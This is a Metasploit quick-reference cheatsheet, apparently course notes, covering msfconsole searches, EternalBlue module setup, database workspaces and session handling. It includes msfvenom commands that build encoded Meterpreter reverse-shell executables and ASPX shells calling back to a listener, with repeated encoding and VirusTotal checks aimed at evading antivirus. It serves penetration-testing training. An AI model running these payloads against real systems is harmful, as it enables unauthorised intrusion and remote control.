---
title: Module 3 - Using Metasploit
tags: [metasploit, msfconsole, msfvenom, exploitation, cheatsheet]
---

# Module 3 - Using Metasploit
> Quick-reference cheatsheet for Metasploit Framework.

---

## Summary

Metasploit Framework (MSF) is the industry-standard exploitation framework. It provides a structured database of exploits, payloads, and auxiliary modules that can be chained together for full attack workflows.

| Component | Purpose |
|-----------|---------|
| **msfconsole** | Interactive shell — search, configure, and run modules |
| **Modules** | Exploits, Auxiliary (scan/fuzz), Post-exploitation, Encoders, NOPs |
| **Payloads** | Singles (self-contained) vs Staged (stager + stage); Meterpreter is the gold standard |
| **msfvenom** | Standalone payload generator — creates executables, shellcode, encoded payloads |
| **Database** | PostgreSQL backend — stores hosts, services, creds, loot across sessions |
| **Workspaces** | Isolate engagement data per client/project |

**Key rule:** `/` in a payload name = staged (`windows/shell/reverse_tcp`). `_` = single (`windows/shell_reverse_tcp`).

---

## MSFConsole

```bash
msfconsole          # launch
msfconsole -q       # launch without banner
msfupdate           # update Metasploit
```

## Searching & Using Modules

```bash
search eternalromance
search type:exploit platform:windows cve:2021 rank:excellent microsoft

use <module_path_or_number>
show options
info
set LHOST <IP>
set RHOSTS <IP>
run
```

## Payloads

```bash
show payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads

# Payload naming: / = staged, _ = single
# windows/shell/reverse_tcp  → staged (stager + stage)
# windows/shell_reverse_tcp  → single (self-contained)
```

## msfvenom

```bash
# Basic payload generation
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <outfile>

# Common formats: exe, aspx, jsp, war, elf, raw, perl, python, bash

# With encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 \
  -e x86/shikata_ga_nai -f exe -o payload.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 \
  -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Check with VirusTotal
msf-virustotal -k <API_key> -f payload.exe
```

## Database & Workspaces

```bash
sudo msfdb init
sudo msfdb run
msf6 > db_status

# Workspaces
workspace           # list
workspace -a <name> # create
workspace <name>    # switch

# Nmap via MSF (stores results in DB)
db_nmap -sV -sS <IP>

# Import external scan
db_import <scan.xml>

# Query stored data
hosts
services
creds
loot
```

## Sessions & Jobs

```bash
sessions            # list active sessions
sessions -i <id>    # interact with session
meterpreter> shell  # drop to shell

jobs -l             # list running jobs
exploit -j          # run exploit as background job
```

---

## All Commands

### MSFConsole Launch & Update

```bash
msfconsole           # launch
msfconsole -q        # launch without banner
msfupdate            # update Metasploit
```

### Searching & Using Modules

```bash
# Search
search eternalromance
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft

# Load and configure
use <module_path_or_number>
show options
show targets
info
set RHOSTS <IP>
set LHOST <IP>
set LPORT <port>
set payload <payload_name>
run
```

### Payloads

```bash
# Browse payloads
show payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```

### msfvenom — Payload Generation

```bash
# Basic
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <outfile>

# ASPX reverse shell example
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

# Avoid bad characters (no encoder)
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

# With encoder
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

# EXE — single encoding pass
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o payload.exe

# EXE — multiple iterations
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Check against VirusTotal
msf-virustotal -k <API_key> -f payload.exe
```

### Database & Workspaces

```bash
# Setup
sudo apt install postgresql postgresql-contrib
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
sudo msfdb run

# Re-init if broken
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q

# In msfconsole
db_status

# Workspaces
workspace               # list
workspace -a Target_1   # create
workspace Target_1      # switch

# Scan and import
db_nmap -sV -sS <IP>
db_import <scan.xml>

# Query stored data
hosts
services
creds
loot
db_export -h
```

### Sessions & Jobs

```bash
# Sessions
sessions                    # list active
sessions -i <id>            # interact with session
meterpreter> shell          # drop to system shell
# Ctrl+Z to background session

# Background listener
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
exploit -j                  # run as background job
jobs -l                     # list running jobs
jobs -h                     # jobs help
```
